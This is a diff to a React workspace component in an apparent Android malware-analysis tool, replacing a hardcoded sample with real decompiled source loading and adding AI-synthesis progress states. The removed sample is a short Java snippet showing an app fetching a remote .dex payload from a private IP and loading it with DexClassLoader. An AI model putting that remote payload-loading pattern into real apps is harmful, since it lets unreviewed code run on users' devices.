@@ -1,28 +1,49 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import clsx from "clsx";
 import { Icon, SeverityTag } from "@/components/primitives";
 import { useAnalysisStore } from "@/store/useAnalysisStore";
+import { readSourceFile } from "@/lib/api";
 
-const SAMPLE_SOURCE = `package com.example.malware;
-
-public class MainActivity extends Activity {
-    @Override
-    protected void onCreate(Bundle saved) {
-        super.onCreate(saved);
-
-        // !! HIGH RISK: Dynamic payload fetching detected
-        String remoteUrl = "http://192.168.1.100/p.dex";
-        DexClassLoader cl = new DexClassLoader(remoteUrl);
-
-        this.startService(new Intent(cl.loadClass("P")));
-    }
-}`;
+const EMPTY_SOURCE = "// Select a decompiled file to view its source.";
 
 export default function Workspace() {
-  const { report } = useAnalysisStore();
+  const { report, stage } = useAnalysisStore();
   const files = report?.static.decompiledFiles ?? [];
   const [active, setActive] = useState(0);
+  const [source, setSource] = useState(EMPTY_SOURCE);
+  const [loadingSource, setLoadingSource] = useState(false);
   const findings = report?.static.findings ?? [];
+  const apkId = report?.meta.id;
+  const activeFile = files[active];
+  const aiPending = stage === "GENAI_SYNTHESIS";
+
+  // Fetch the actual decompiled source for the selected file.
+  useEffect(() => {
+    let cancelled = false;
+    if (!apkId || !activeFile) {
+      setSource(EMPTY_SOURCE);
+      return;
+    }
+    setLoadingSource(true);
+    readSourceFile(apkId, activeFile)
+      .then((r) => {
+        if (!cancelled) setSource(r.content || EMPTY_SOURCE);
+      })
+      .catch((e) => {
+        if (!cancelled) setSource(`// Failed to load ${activeFile}\n// ${String(e)}`);
+      })
+      .finally(() => {
+        if (!cancelled) setLoadingSource(false);
+      });
+    return () => {
+      cancelled = true;
+    };
+  }, [apkId, activeFile]);
+
+  // Reset selection when a new report loads.
+  useEffect(() => {
+    setActive(0);
+  }, [apkId]);
 
   return (
     <div className="flex h-full flex-col">
@@ -84,7 +105,7 @@ export default function Workspace() {
           </div>
           <div className="flex-1 overflow-auto bg-black/10 p-4">
             <pre className="text-[13px] leading-relaxed">
-              <code>{SAMPLE_SOURCE}</code>
+              <code>{loadingSource ? "// Loading source…" : source}</code>
             </pre>
           </div>
 
@@ -145,6 +166,13 @@ export default function Workspace() {
             <span>AI_SYNTHESIS_EXEC</span>
           </div>
           <div className="flex-1 space-y-4 overflow-y-auto p-4 text-xs leading-relaxed">
+            {aiPending && (
+              <div className="tui-border border-sage/30 bg-sage/5 p-3 text-[11px] text-sage">
+                <Icon name="progress_activity" className="mr-1 animate-spin text-[13px]" />
+                AI synthesis running… decompiled sources are browsable now; the
+                report will populate here when it completes.
+              </div>
+            )}
             {report?.ai ? (
               <>
                 <p className="opacity-80">{report.ai.summary}</p>
@@ -167,9 +195,11 @@ export default function Workspace() {
                 </p>
               </>
             ) : (
-              <div className="py-8 text-center text-on-surface-variant">
-                AI synthesis not yet generated.
-              </div>
+              !aiPending && (
+                <div className="py-8 text-center text-on-surface-variant">
+                  AI synthesis not yet generated.
+                </div>
+              )
             )}
           </div>
         </aside>
